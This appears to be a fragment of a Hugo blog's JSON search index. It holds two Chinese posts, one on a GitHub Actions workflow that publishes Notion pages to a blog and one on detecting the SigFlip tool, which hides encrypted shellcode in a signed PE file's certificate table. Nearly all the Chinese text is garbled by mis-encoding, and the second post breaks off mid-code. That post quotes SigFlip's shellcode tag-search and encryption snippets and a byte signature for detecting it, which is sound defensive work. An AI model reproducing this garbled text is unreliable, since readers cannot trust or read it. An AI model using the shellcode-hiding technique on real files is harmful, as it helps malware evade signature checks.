åˆ°å›¾åºŠï¼Œç„¶åè´´å…¥markdownï¼Œç„¶åå†æ¨é€åˆ°githubï¼Œç­‰å¾…actionè‡ªåŠ¨æ„å»ºé™æ€åšå®¢\næ—¢ç„¶æˆ‘ä½¿ç”¨notionè®°å½•ç¬”è®°ï¼Œä½•ä¸ç»§ç»­All-in-oneï¼Œå°†notionä½œä¸ºæˆ‘çš„åšå®¢å‘å¸ƒå·¥å…·ã€‚\nåªéœ€è¦åœ¨ notion ä¸­å»ºç«‹ä¸€ä¸ªç”¨äºåšå®¢å‘å¸ƒçš„ databaseï¼Œç„¶åå†™å®Œç¬”è®°åå¡«å…¥è¿™ä¸ª databaseï¼Œå†ä½¿ç”¨ä¸€äº›æ‰‹æ®µè§¦å‘ CI å³å¯å®Œæˆåšå®¢æ–‡ç« çš„å‘å¸ƒ\nå·¥å…·ä»‹ç» è¯´å¹²å°±å¹²ï¼Œå†™äº†ä¸¤ä¸ªå·¥å…·\nhttps://github.com/akkuman/notiontomd\nhttps://github.com/akkuman/notion_to_github_blog\nnotiontomd æ˜¯ç”¨æ¥notionä¸­çš„æŸä¸ªpageè½¬åŒ–ä¸ºmarkdownçš„åº“ï¼Œå½“ç„¶ï¼Œå½“å‰æ”¯æŒçš„blockæ˜¯æœ‰é™çš„ï¼Œè¯¦ç»†ä¿¡æ¯å¯ä»¥æŸ¥çœ‹è¯¥ä»“åº“\nnotion_to_github_blogåˆ™æ˜¯ä¸€ä¸ªgithub actionæ¨¡æ¿ï¼Œç”¨æ¥è‡ªåŠ¨ä»æŒ‡å®šæ ¼å¼çš„databaseä¸­æ‹‰å–éœ€è¦æ›´æ–°å‘å¸ƒçš„æ–‡ç« ï¼Œç„¶ååˆ©ç”¨ notiontomd è½¬åŒ–ä¸ºmarkdownï¼Œç„¶åæ¨é€åˆ°githubä»“åº“ï¼Œå†è§¦å‘å¦å¤–çš„github acitonè¿›è¡Œåšå®¢é™æ€æ–‡ä»¶æ„å»º\nä½¿ç”¨ æ€ä¹ˆå»ºä»“æ€ä¹ˆè‡ªåŠ¨ä»æŸåˆ†æ”¯æ‹‰å–æ¨åˆ°github pagesæ‰€åœ¨åˆ†æ”¯æˆ‘å°±ä¸å±•å¼€è¯´æ˜äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»ç½‘ä¸Šæœç´¢ç›¸å…³èµ„æ–™ï¼Œæœ¬æ–‡æ‰€å…³æ³¨çš„æµç¨‹æ˜¯ä»notion databaseåˆ°åšå®¢æºæ–‡ä»¶\nåŸºç¡€ç¯å¢ƒ æœ¬æ–‡æ‰€æ¶‰åŠåˆ°çš„ä¾‹å­ç¯å¢ƒå¯ä»¥å‰å¾€æˆ‘çš„åšå®¢ä»“åº“ https://github.com/akkuman/akkuman.github.io è¿›è¡ŒæŸ¥çœ‹\nhugoåˆ†æ”¯ç”¨æ¥å­˜æ”¾åšå®¢æºæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªgithub actionçš„åŠŸèƒ½æ˜¯pushæ—¶è§¦å‘ï¼Œç„¶åè‡ªåŠ¨æ„å»ºæ¨é€åˆ°masteråˆ†æ”¯\nmasteråˆ†æ”¯ç”¨æ¥å­˜æ”¾hugoæ„å»ºä¹‹åç”Ÿæˆçš„ç«™ç‚¹é™æ€æ–‡ä»¶\nåšå®¢ç›¸å…³çš„å›¾ç‰‡æˆ‘ä¼šæ¨é€åˆ° https://github.com/akkuman/pic ä»“åº“\nhugoä½œä¸ºä¸»åˆ†æ”¯ï¼Œmasterè®¾ç½®ä¸ºgithub pagesåˆ†æ”¯ï¼ˆåŸå› åé¢æè¿°ï¼‰\nworkflowsç¼–å†™ è¦ä½¿ç”¨è¯¥actionï¼Œé¦–å…ˆä½ éœ€è¦åœ¨Â notionÂ ä¸­åˆ›å»ºä¸€ä¸ªÂ databaseï¼Œè¿™ä¸ªÂ databaseÂ éœ€è¦æœ‰å‡ ä¸ªå­—æ®µï¼Œå­—æ®µåå¦‚ä¸‹:\nNameÂ (title):Â æ–‡ç« æ ‡é¢˜\nArticleÂ (text):Â æ–‡ç« é“¾æ¥\nMDFilenameÂ (text):Â åˆ›å»ºçš„Â markdownÂ æ–‡ä»¶å\nCategoryÂ (select):Â æ–‡ç« åˆ†ç±»\nTagsÂ (multi_select):Â æ–‡ç« æ ‡ç­¾\nIsPublishÂ (checkbox):Â æ–‡ç« æ˜¯å¦å‘å¸ƒ\nNeedUpdateÂ (checkbox):Â æ–‡ç« æ˜¯å¦æœ‰æ›´æ–°\nCreateAtÂ (CreatedÂ time):Â åˆ›å»ºæ—¶é—´\nUpdateAtÂ (LastÂ editedÂ time):Â æ›´æ–°æ—¶é—´\né»˜è®¤å½“Â IsPublishÂ æœªå‹¾é€‰æˆ–Â NeedUpdateÂ å‹¾é€‰çš„é¡¹ç›®æ‰ä¼šè§¦å‘æµç¨‹ï¼Œå³Â IsPublish=falseÂ ||Â NeedUpdate=trueÂ æ—¶è§¦å‘\næ ·ä¾‹å¦‚ä¸‹\nç„¶åä½ éœ€è¦åœ¨ä½ å­˜æ”¾åšå®¢æºæ–‡ä»¶çš„ä»“åº“è¿›è¡Œä¸€äº›è®¾ç½®ï¼Œæ”¾ç½®ä¸Šworkflows\nä¸‹é¢ä»¥æˆ‘çš„githubåšå®¢ä»“åº“ akkuman/akkuman.github.io ä¸ºä¾‹è¿›è¡Œè¯´æ˜\næˆ‘ä»¬åˆ›å»ºä¸€ä¸ªworkflows: akkuman/akkuman.github.io/.github/workflows/xxx.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 name: Notion To Blog on: issues: types: [opened] jobs: notion-to-blog: if: ${{ github.event.issue.user.login == github.actor \u0026amp;\u0026amp; contains(github.event.issue.title, \u0026#39;notion-ci\u0026#39;) }} runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 with: # Workflows are only triggered when commits (and tags I think, but it would need to be tested) are created pushed using a Personal Access Token (PAT). # ref: https://github.com/EndBug/add-and-commit/issues/311#issuecomment-948749635 token: ${{ secrets.CHECKOUT_TOKEN }} - name: Markdown From Notion uses: akkuman/notion_to_github_blog@master with: notion_token: ${{ secrets.NOTION_TOKEN }} notion_database_id: ${{ secrets.NOTION_DATABASE_ID }} img_store_type: github img_store_path_prefix: notionimg # img_store_url_path_prefix: ${{ secrets.IMG_STORE_URL_PATH_PREFIX }} # Actions run as an user, but when they are running in a fork there are potential security problems, so they are degraded to \u0026#34;read-only\u0026#34; # ref: https://github.com/actions/first-interaction/issues/10#issuecomment-546628432 # ref: https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token # so you should set another token img_store_github_token: ${{ secrets.CHECKOUT_TOKEN }} img_store_github_repo: akkuman/pic img_store_github_branch: master # md_store_path_prefix: ${{ secrets.MD_STORE_PATH_PREFIX }} - name: push to github uses: EndBug/add-and-commit@v7 with: branch: hugo message: \u0026#39;Notion CI\u0026#39; å­—æ®µè§£é‡Šï¼š\nnotion_token: notionç”³è¯·çš„appçš„api token\nnotion_database_id: notionä¸­éœ€è¦ä½œä¸ºåšå®¢å‘å¸ƒçš„databaseçš„idï¼Œè¿™æ˜¯ä¸€ä¸ªuuidï¼Œå¯ä»¥é€šè¿‡Share-\u0026gt;Copy linkè·å–ï¼Œæ³¨æ„éœ€è¦æŠŠå…¶ä¸­çš„idè½¬åŒ–ä¸ºuuidçš„æ ¼å¼ï¼Œæ¯”å¦‚ Copy linkå‡ºæ¥ä¸ºÂ https://www.notion.so/akkuman/7bf568e946b946189b2b4af0c61b9e78?v=c45b5e45e96541f4bf81994ab4af1a6eï¼Œåˆ™notion_database_idä¸ºÂ 7bf568e9-46b9-4618-9b2b-4af0c61b9e78ï¼Œå¹¶ä¸”ä½ æ‰€è¦å‘å¸ƒçš„æ–‡ç« ä»¥åŠè¯¥databaseéƒ½éœ€è¦inviteæˆ‘ä»¬ä¸Šé¢ç”³è¯·çš„appï¼ˆä¸ºäº†tokenèƒ½å¤Ÿè·å–åˆ°å†…å®¹ï¼‰\nimg_store_type: notionä¸­æå–å‡ºæ¥çš„å›¾ç‰‡ä¿å­˜åˆ°å“ªï¼Œå¯é€‰ local æˆ–è€… githubï¼Œlocalä»£è¡¨ä¿å­˜åˆ°æºä»“åº“ï¼Œgithubä»£è¡¨ä¿å­˜åˆ°å¦ä¸€ä¸ªgithubä»“åº“ï¼ˆå›¾åºŠï¼‰ä¸­å»ï¼Œé»˜è®¤ä¸ºÂ local\nimg_store_path_prefix: å›¾ç‰‡ä¿å­˜çš„è·¯å¾„å‰ç¼€ï¼Œé»˜è®¤ä¸ºÂ static/notionimg\nimg_store_url_path_prefixï¼š å½“Â img_store_type=localÂ æ—¶éœ€è¦ï¼Œè®¾ç½®åœ¨markdownå›¾ç‰‡é“¾æ¥ä¸­çš„å‰ç¼€ï¼Œå’Œä¸Šé¢çš„Â img_store_path_prefixÂ ä¸ç›¸åŒï¼Œæ¯”å¦‚Â img_store_path_prefix='static/notionimg' img_store_url_path_prefixï¼š='/notionimg/'Â çš„æƒ…å†µä¸‹ï¼Œåˆ™å›¾ç‰‡ä¿å­˜è·¯å¾„ä¸º \u0026lsquo;./static/notionimg/{img_md5}{img_ext}\u0026rsquo;, è€Œåœ¨markdownæ–‡ä»¶ä¸­çš„ä½“ç°ä¸ºÂ ![](/notionimg/{img_md5}{img_ext})\nimg_store_github_token: å½“Â img_store_type=githubÂ æ—¶éœ€è¦ï¼Œè®¾ç½®ä¿å­˜å›¾ç‰‡åˆ°githubå›¾åºŠæ‰€ä½¿ç”¨çš„tokenï¼ˆsecrets.GITHUB_TOKENÂ åªæœ‰è¯»æƒé™ï¼Œæ‰€ä»¥éœ€è¦å¦å¤–ä½¿ç”¨ï¼‰\nimg_store_github_repo: å½“Â img_store_type=githubÂ æ—¶éœ€è¦ï¼Œä½ æŠŠå“ªä¸ªä»“åº“å½“ä½œgithubå›¾åºŠ\nimg_store_github_branch: å½“Â img_store_type=githubÂ æ—¶éœ€è¦ï¼Œä½ æŠŠå“ªä¸ªgithubå›¾åºŠä»“åº“çš„å“ªä¸€ä¸ªåˆ†æ”¯å½“ä½œå›¾åºŠ\nmd_store_path_prefix: æœ€åç”Ÿæˆçš„markdownæ–‡ä»¶ä¿å­˜åœ¨å“ªï¼Œé»˜è®¤æ˜¯å½“å‰ä»“åº“ç›®å½•çš„Â content/postsÂ ç›®å½•ä¸‹\nå…¶ä¸­éœ€è¦å…³æ³¨çš„æ˜¯\ntoken: ${{ secrets.CHECKOUT_TOKEN }}Â æ˜¯ä¸ºäº†åé¢çš„Â push to githubÂ æ¨é€åèƒ½å¤Ÿè§¦å‘å¦å¤–ä¸€ä¸ªactionæµç¨‹ï¼Œå¦åˆ™æ— æ³•è§¦å‘ï¼Œå…¶ä¸­çš„Â CHECKOUT_TOKENÂ ä¸ºä½ åˆ›å»ºçš„ Personal Access Tokenï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹æˆ‘ä¸Šé¢çš„æ³¨é‡Š\non: issues: types: [opened]Â çš„ä¸»è¦ä½œç”¨æ˜¯å½“æ‰“å¼€æˆ–æäº¤ä¸€ä¸ªissueæ—¶è§¦å‘è¯¥action\nif: ${{ github.event.issue.user.login == github.actor \u0026amp;\u0026amp; contains(github.event.issue.title, 'notion-ci') }}Â çš„ä¸»è¦ä½œç”¨æ˜¯ï¼šå½“æäº¤issueçš„äººæ˜¯ä½ è‡ªå·±ï¼Œå¹¶ä¸”issueæ ‡é¢˜åŒ…å« notion-ci æ—¶è¿›è¡Œactionæµç¨‹\næ³¨æ„: åªæœ‰å½“workflowsåœ¨ä¸»åˆ†æ”¯æ—¶ï¼Œä½¿ç”¨Â issuesÂ ä½œä¸ºè§¦å‘æ¡ä»¶æ‰ä¼šç”Ÿæ•ˆï¼Œæ‰€ä»¥æˆ‘ä¸ªäººæ˜¯å°†Â hugoÂ ä½œä¸ºä¸»åˆ†æ”¯ï¼Œå°†Â masterÂ ä½œä¸ºÂ Github PagesÂ åˆ†æ”¯\næµ‹è¯• é¦–å…ˆç”³è¯·ä¸€ä¸ªtokenï¼Œåœ¨ https://www.notion.so/my-integrations ç‚¹å‡» + New integration ï¼Œç„¶åé…ç½®å¥½ä½ æƒ³è¦çš„appåç§°ï¼Œä»¥åŠè®¾ç½®åˆ°çš„å·¥ä½œåŒºï¼Œè¿™é‡Œæˆ‘å–çš„åç§°æ˜¯ api\nç„¶åæˆ‘ä»¬éœ€è¦æŠŠæŒ‡å®šçš„databseä»¥åŠæ‰€éœ€è¦å‘å¸ƒçš„æ–‡ç« éƒ½é›†æˆæˆ‘ä»¬ç”³è¯·çš„app\nä»¥åŠéœ€è¦å‘å¸ƒçš„æ–‡ç« \næ³¨æ„ï¼šdatabaseä¸­çš„Articleåˆ—ï¼ŒæŒ‰ä¸‹ @ å·æ¥æœç´¢é€‰æ‹©æ–‡ç« \ngithubé…ç½®å¥½ç›¸å…³çš„ Secrets ï¼Œ\næˆ‘ä»¬åœ¨ä»“åº“ä¸­æäº¤ä¸€ä¸ªæ ‡é¢˜åŒ…å« notion-ci çš„issueï¼Œå³å¯è§¦å‘workflows\nå…¨è‡ªåŠ¨æ•´ä¸ªæµç¨‹ å¹³å°è°ƒç ” æ ¹æ®å®˜æ–¹æ–‡ç«  Connect your tools to Notion with the API ä¸­æ‰€æåˆ°çš„ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€äº›å¯ä»¥ç”¨äºnotionçš„è‡ªåŠ¨åŒ–é›†æˆå¹³å°ï¼Œå¯¹æ¯”äº†ä¸€ä¸‹ï¼Œautomate.io åº”è¯¥æ˜¯æœ€å®æƒ çš„å¹³å°ï¼Œå…è´¹ç”¨æˆ·æ¯ä¸ªæœˆå¯ä»¥è§¦å‘300æ¬¡ï¼Œä¸€èˆ¬è€Œè¨€ï¼Œå¯¹äºåšå®¢æ¥è¯´å¤Ÿäº†\nè‡ªåŠ¨åŒ–é›†æˆ åœ¨ https://automate.io/app/signup æ³¨å†Œå¥½è´¦å·åï¼Œæ‰“å¼€ Add an Issue in GitHub on a New Database Item in Notion ï¼Œåœ¨databaseæ·»åŠ æ¡ç›®æ—¶åœ¨æŒ‡å®šçš„githubä»“åº“æ·»åŠ ä¸€æ¡issue\né¦–å…ˆç‚¹é€‰ Link Notion ï¼Œä¸€è·¯ä¸‹ä¸€æ­¥ï¼Œå‡ºç°ä¸‹é¢çš„é¡µé¢æ—¶ï¼Œç‚¹é€‰æˆ‘ä»¬çš„databse\nç„¶åç¡®è®¤åç‚¹é€‰æˆ‘ä»¬çš„database\nç„¶åç»§ç»­ Link Github æˆäºˆgithubæƒé™ï¼ˆæ³¨æ„ï¼Œè¿™ä¸ªåº”ç”¨æ‰€éœ€çš„æƒé™è¾ƒå¤§ï¼‰\nç„¶åé…ç½®ä¸€ä¸‹ç›¸å…³å±æ€§\næ³¨æ„é€‰å¥½ç›¸å…³ä»“åº“ï¼Œä»¥åŠ Title ä¸­éœ€è¦åŒ…å« notion-ci\nç¡®è®¤å°±å¥½äº†ï¼Œå½“ç„¶ï¼Œæœ‰ä¸€äº›ç¼ºé™·ï¼Œå…è´¹çš„æ˜¯æ¯äº”åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡ï¼Œç­‰ä¸åŠçš„è¯ï¼Œä½ è¿˜æ˜¯å¯ä»¥æ‰‹åŠ¨æäº¤issueè§¦å‘\nç°åœ¨å°è¯•åœ¨databaseä¸­ä½¿ç”¨å³ä¸Šè§’çš„ New æ–°å¢ä¸€ä¸ªæ¡ç›®ï¼ŒæŸ¥çœ‹ä¼šæœ‰ä»€ä¹ˆå˜åŒ–\næ³¨æ„ï¼šæ‰€æœ‰æ¶‰åŠåˆ°çš„æ–‡ç« ï¼Œéƒ½éœ€è¦inviteæˆ‘ä»¬å…ˆå‰åˆ›å»ºçš„appï¼Œå¦åˆ™github actionæ— æ³•è¯»å–åˆ°\n","permalink":"https://www.hacktech.cn/post/notion-to-github-blog.html","summary":"\u003cp\u003enotionæ˜¯ç”¨æ¥è®°å½•ç¬”è®°çš„ï¼Œhugoæ˜¯æˆ‘ç”¨æ¥ä½œä¸ºgithubåšå®¢è‡ªåŠ¨æ„å»ºå‘å¸ƒçš„\u003c/p\u003e\n\u003cp\u003eæˆ‘ç›®å‰è®¾ç½®äº†ä¸€ä¸ªgithub actionæ˜¯ï¼šå½“æˆ‘çš„åšå®¢ä»“åº“hugoåˆ†æ”¯æœ‰pushäº‹ä»¶æ—¶ï¼Œè‡ªåŠ¨æ„å»ºæ–‡ç« å‘å¸ƒåˆ°masteråˆ†æ”¯ï¼Œå¹¶ä¸”å‘å¸ƒåˆ°åšå®¢å›­ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ä¼šæœ‰è¿™æ ·çš„ä¸ä¾¿ï¼šåœ¨notionä¸­å†™äº†ä¸€ç¯‡ç¬”è®°æˆ–æ–‡ç« ï¼Œæƒ³è¦å‘å¸ƒåˆ°githubé™æ€åšå®¢ä¸Šï¼Œå‘ç°éœ€è¦å…ˆå°†æ–‡ç« è½¬åŒ–æˆmarkdownï¼Œå›¾ç‰‡éœ€è¦ä¸Šä¼ åˆ°å›¾åºŠï¼Œç„¶åè´´å…¥markdownï¼Œç„¶åå†æ¨é€åˆ°githubï¼Œç­‰å¾…actionè‡ªåŠ¨æ„å»ºé™æ€åšå®¢\u003c/p\u003e\n\u003cp\u003eæ—¢ç„¶æˆ‘ä½¿ç”¨notionè®°å½•ç¬”è®°ï¼Œä½•ä¸ç»§ç»­All-in-oneï¼Œå°†notionä½œä¸ºæˆ‘çš„åšå®¢å‘å¸ƒå·¥å…·ã€‚\u003c/p\u003e\n\u003cp\u003eåªéœ€è¦åœ¨ notion ä¸­å»ºç«‹ä¸€ä¸ªç”¨äºåšå®¢å‘å¸ƒçš„ databaseï¼Œç„¶åå†™å®Œç¬”è®°åå¡«å…¥è¿™ä¸ª databaseï¼Œå†ä½¿ç”¨ä¸€äº›æ‰‹æ®µè§¦å‘ CI å³å¯å®Œæˆåšå®¢æ–‡ç« çš„å‘å¸ƒ\u003c/p\u003e\n\u003ch2 id=\"å·¥å…·ä»‹ç»\"\u003eå·¥å…·ä»‹ç»\u003c/h2\u003e\n\u003cp\u003eè¯´å¹²å°±å¹²ï¼Œå†™äº†ä¸¤ä¸ªå·¥å…·\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/akkuman/notiontomd\"\u003ehttps://github.com/akkuman/notiontomd\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/akkuman/notion_to_github_blog\"\u003ehttps://github.com/akkuman/notion_to_github_blog\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003enotiontomd\u003c/code\u003e æ˜¯ç”¨æ¥notionä¸­çš„æŸä¸ªpageè½¬åŒ–ä¸ºmarkdownçš„åº“ï¼Œå½“ç„¶ï¼Œå½“å‰æ”¯æŒçš„blockæ˜¯æœ‰é™çš„ï¼Œè¯¦ç»†ä¿¡æ¯å¯ä»¥æŸ¥çœ‹è¯¥ä»“åº“\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003enotion_to_github_blog\u003c/code\u003eåˆ™æ˜¯ä¸€ä¸ªgithub actionæ¨¡æ¿ï¼Œç”¨æ¥è‡ªåŠ¨ä»æŒ‡å®šæ ¼å¼çš„databaseä¸­æ‹‰å–éœ€è¦æ›´æ–°å‘å¸ƒçš„æ–‡ç« ï¼Œç„¶ååˆ©ç”¨ \u003ccode\u003enotiontomd\u003c/code\u003e è½¬åŒ–ä¸ºmarkdownï¼Œç„¶åæ¨é€åˆ°githubä»“åº“ï¼Œå†è§¦å‘å¦å¤–çš„github acitonè¿›è¡Œåšå®¢é™æ€æ–‡ä»¶æ„å»º\u003c/p\u003e\n\u003ch2 id=\"ä½¿ç”¨\"\u003eä½¿ç”¨\u003c/h2\u003e\n\u003cp\u003eæ€ä¹ˆå»ºä»“æ€ä¹ˆè‡ªåŠ¨ä»æŸåˆ†æ”¯æ‹‰å–æ¨åˆ°github pagesæ‰€åœ¨åˆ†æ”¯æˆ‘å°±ä¸å±•å¼€è¯´æ˜äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»ç½‘ä¸Šæœç´¢ç›¸å…³èµ„æ–™ï¼Œæœ¬æ–‡æ‰€å…³æ³¨çš„æµç¨‹æ˜¯ä»notion databaseåˆ°åšå®¢æºæ–‡ä»¶\u003c/p\u003e\n\u003ch3 id=\"åŸºç¡€ç¯å¢ƒ\"\u003eåŸºç¡€ç¯å¢ƒ\u003c/h3\u003e\n\u003cp\u003eæœ¬æ–‡æ‰€æ¶‰åŠåˆ°çš„ä¾‹å­ç¯å¢ƒå¯ä»¥å‰å¾€æˆ‘çš„åšå®¢ä»“åº“ \u003ca href=\"https://github.com/akkuman/akkuman.github.io\"\u003ehttps://github.com/akkuman/akkuman.github.io\u003c/a\u003e è¿›è¡ŒæŸ¥çœ‹\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ehugoåˆ†æ”¯ç”¨æ¥å­˜æ”¾åšå®¢æºæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªgithub actionçš„åŠŸèƒ½æ˜¯pushæ—¶è§¦å‘ï¼Œç„¶åè‡ªåŠ¨æ„å»ºæ¨é€åˆ°masteråˆ†æ”¯\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emasteråˆ†æ”¯ç”¨æ¥å­˜æ”¾hugoæ„å»ºä¹‹åç”Ÿæˆçš„ç«™ç‚¹é™æ€æ–‡ä»¶\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eåšå®¢ç›¸å…³çš„å›¾ç‰‡æˆ‘ä¼šæ¨é€åˆ° \u003ca href=\"https://github.com/akkuman/pic\"\u003ehttps://github.com/akkuman/pic\u003c/a\u003e ä»“åº“\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ehugoä½œä¸ºä¸»åˆ†æ”¯ï¼Œmasterè®¾ç½®ä¸ºgithub pagesåˆ†æ”¯ï¼ˆåŸå› åé¢æè¿°ï¼‰\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"workflowsç¼–å†™\"\u003eworkflowsç¼–å†™\u003c/h3\u003e\n\u003cp\u003eè¦ä½¿ç”¨è¯¥actionï¼Œé¦–å…ˆä½ éœ€è¦åœ¨Â notionÂ ä¸­åˆ›å»ºä¸€ä¸ªÂ databaseï¼Œè¿™ä¸ªÂ databaseÂ éœ€è¦æœ‰å‡ ä¸ªå­—æ®µï¼Œå­—æ®µåå¦‚ä¸‹:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eNameÂ (title):Â æ–‡ç« æ ‡é¢˜\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eArticleÂ (text):Â æ–‡ç« é“¾æ¥\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eMDFilenameÂ (text):Â åˆ›å»ºçš„Â markdownÂ æ–‡ä»¶å\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCategoryÂ (select):Â æ–‡ç« åˆ†ç±»\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eTagsÂ (multi_select):Â æ–‡ç« æ ‡ç­¾\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIsPublishÂ (checkbox):Â æ–‡ç« æ˜¯å¦å‘å¸ƒ\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eNeedUpdateÂ (checkbox):Â æ–‡ç« æ˜¯å¦æœ‰æ›´æ–°\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCreateAtÂ (CreatedÂ time):Â åˆ›å»ºæ—¶é—´\u003c/p\u003e","title":"notionå®ç°è‡ªåŠ¨å‘å¸ƒåˆ°hugo githubåšå®¢"},{"content":"æœ€è¿‘åœ¨ç§»æ¤ med0x2e/SigFlip çš„è¿‡ç¨‹ä¸­å‘ç°äº†ä¸€ä¸ªæœ‰æ„æ€çš„ç‚¹ï¼Œå¯ä»¥ç”¨æ¥ä½œä¸ºæ£€æµ‹çš„æ‰‹æ®µ\nåœ¨ SigFlip é¡¹ç›®çš„ Detect/Prevent ä¸€èŠ‚ä¸­ä½œè€…æœ‰æåˆ°ä¸€äº›æ£€æµ‹é˜²å¾¡æ‰‹æ®µ\nhttps://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2014/2915720?redirectedfrom=MSDN\nOnce the patch is installed and proper registry keys are set, No system restarts are required, you only need to restart the Cryptographic Services. The Applocker service will be also restarted as it depends on the cryptographic services.(@p0w3rsh3ll)\nYara rule by Adrien;Â https://twitter.com/Int2e_/status/1330975808941330432\nä» SigFlip æºç ä¸­ï¼Œå…¶å®ä¹Ÿèƒ½å‘ç°ä¸€ä¸ªç‚¹\nSigFlip ä¾èµ–ä¸€ä¸²ç‰¹å®šçš„å­—èŠ‚æ¥å®šä½shellcodeçš„ä½ç½®ï¼Œè¯¦è§ Native/SigLoader/SigLoader/SigLoader.cpp#L102 å’Œ Native/SigFlip/SigFlip/SigFlip.cpp#L232\n1 2 3 4 5 6 7 for (_index = 0; _index \u0026lt; _CertTableSize; _index++) { if (*(_pePtr + _index) == 0xfe \u0026amp;\u0026amp; *(_pePtr + _index + 1) == 0xed \u0026amp;\u0026amp; *(_pePtr + _index + 2) == 0xfa \u0026amp;\u0026amp; *(_pePtr + _index + 3) == 0xce) { printf(\u0026#34;[*]: Tag Found 0x%x%x%x%x\u0026#34;, *(_pePtr + _index), *(_pePtr + _index+1), *(_pePtr + _index+2), *(_pePtr + _index+3)); _dataOffset = _index + 8; break; } } 1 2 memcpy(_encryptedData, \u0026#34;\\xFE\\xED\\xFA\\xCE\\xFE\\xED\\xFA\\xCE\u0026#34;, 8); crypt((unsigned char*)_data, _dataSize, _key, _keySize, (unsigned char*)_encryptedData + 8); ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨è¯ä¹¦è¡¨ä¸­å®šä½åˆ° \\xFE\\xED\\xFA\\xCE\\xFE\\xED\\xFA\\xCE è¿™æ®µç‰¹å¾å°±å¯ä»¥æ–­å®šå®ƒç–‘ä¼¼ SigFlip ç”Ÿæˆçš„ payload äº†ï¼Œæƒ³è¦æ›´ç²¾å‡†ä¸€äº›å¯ä»¥ç»“åˆ https://twitter.com/Int2e_/status/1330975808941330432 ä¸­æåˆ°çš„é•¿åº¦ç‰¹å¾ã€‚\nå¦å¤–å¾ˆæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯ï¼Œè¿™ä¸ªé¡¹ç›®æ˜¯æœ‰é—®é¢˜çš„ï¼ˆæˆªè‡³20211103 commit ~~~~e24a1fc~~~~ï¼‰ï¼Œè¯¦è§ ~~~~Native/SigFlip/SigFlip/SigFlip.cpp#L164~~~~ å’Œ ~~~~Native/SigFlip/SigFlip/SigFlip.cpp#L260~~~~ï¼Œå¾ˆå¤šæƒ…å†µä¸‹è¯¥é¡¹ç›®æ ¹æœ¬æ²¡æ³•æ­£å¸¸ä½¿ç”¨ï¼Œå› ä¸ºpeæ–‡ä»¶çš„RVAå’ŒFOAä¹‹é—´çš„å…³ç³»ä½œè€…å¹¶æ²¡æœ‰è¿›è¡Œå¤„ç†ï¼Œåªæœ‰å½“peæ–‡ä»¶ä¸­çš„ ~~SectionAlignment~~ å’Œ ~~FileAlignment~~ ä¸€æ ·æ—¶ï¼ŒRVAæ‰ç­‰äºFOAï¼Œå¯¼è‡´çš„ç»“æœæ˜¯ï¼Œå¯èƒ½ä½¿ç”¨å·¥å…·åç­¾åä¼šå¤±æ•ˆã€‚é”™è¯¯çš„ä½ç½®ï¼ŒåŠ ä¸Šä¸Šé¢çš„ç‰¹å¾ç ï¼Œè¿™ä¸ªæ›´åŠ æ˜¯ä¸€ä¸ªå¼ºç‰¹å¾äº†ã€‚å…¬é¸¡é˜Ÿä¹‹å®¶ä¿®æ”¹åçš„ ~~~~CrackerCat/sigFile~~~~ ä¹Ÿæ²¡æœ‰ä¿®æ­£è¿™ä¸ªbugã€‚\nä¸Šé¢æ˜¯æˆ‘è½æ’äº†ï¼ŒIMAGE_DIRECTORY_ENTRY_SECURITY è¿™ä¸ªç»“æ„çš„ VirtualAddress å°±æ˜¯ç›¸å¯¹äºæ–‡ä»¶å¼€å¤´çš„åç§»ï¼Œå¯å‚è§ Does DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress actually mean file offset? å’Œ SigThief çš„ç›¸å…³å®ç°ï¼Œæ‰€ä»¥è¿™ä¸ªå¹¶ä¸æ˜¯bug\nå¦å¤–è¿˜æœ‰ä¸€ä¸ªbugï¼Œæ³¨æ„åœ¨ Native/SigFlip/SigFlip/SigFlip.cpp#L149-L159\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //Security entry seems to be located at the 7th offset (Data_Dir) for For x64 PE files, and the 5th offset for x86 PE files. just a quick workaround to make the script work for different PE archs. if (IsWow64(GetCurrentProcess())) { if (_optHeader.Magic == 0x20B) { _DT_SecEntry_Offset = 2; } } else { if (_optHeader.Magic == 0x10B) { 